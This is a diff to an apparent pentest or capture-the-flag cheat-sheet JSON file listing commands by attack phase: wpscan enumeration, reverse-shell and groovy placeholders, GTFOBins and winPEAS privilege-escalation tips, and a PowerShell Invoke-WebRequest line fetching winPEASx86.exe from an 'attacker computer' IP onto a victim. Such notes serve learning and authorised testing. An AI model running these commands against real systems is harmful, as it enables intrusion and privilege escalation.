@@ -42,29 +42,48 @@
             "description": "The output is pretty noisy, recommend outputing to file."
         },
         {
-            "command": "Wpscan to enumerate users",
-            "section": "recon",
-            "description": "Would recommend outputting to a file."
-        },
-        {
             "command": "wpscan --url [address] --enumerate p",
             "section": "recon",
-            "description": "Would recommend outputting to a file."
+            "description": "[Needs to be vetted] Scans a WordPress website's plugins."
         }
     ],
     
     "init":
     [
         {
-            "command": "first initial access placeholder",
-            "section": "first initial access placeholder",
-            "description": "first initial access placeholder"
+            "command": "Start a reverse shell",
+            "section": "Initial Access",
+            "description": "Needs access to remote code execution."
         },
         {
-            "command": "second initial access placeholder",
-            "section": "second initial access placeholder",
+            "command": "groovy > [temp placement]",
+            "section": "Initial Access",
             "description": "second initial access placeholder"
         }
-    ]
+    ],
 
+    "privesc":
+    [
+        {
+            "command": "GTFObins",
+            "section": "Privilege Escalation",
+            "description" : "Check the GTFOBins website and find executables that you can run as a higher level user. This website contains a curated list of binaries that can produce a shell."
+        }
+    ],
+
+    "discovery":
+    [
+        {
+            "command": "winPEASx86",
+            "section": "Discovery",
+            "description": "WinPEAS is exclusive to Windows - linPEAS is the linux equiavlent. There is x86 and x64 versions available, do the 'systeminfo' command on cmd.exe to see the computer architecture. There is a lot of output, so would recommend outputting to a file."
+        }
+    ],
+
+    "file":
+    {
+        "command": "powershell -c \"Invoke-WebRequest http://10.13.22.171:80/winPEASx86.exe -OutFile winPEASx86.exe\"",
+        "section": "Exfiltration/File Movement",
+        "description": "Download file from attacker computer to victim computer with powershell on victim pc. This requires attacker computer to have file server - see hosting file server commands. The first part 'powershell -c' is to execute a powershell command/scriptblock from command line. "
+    }
 }
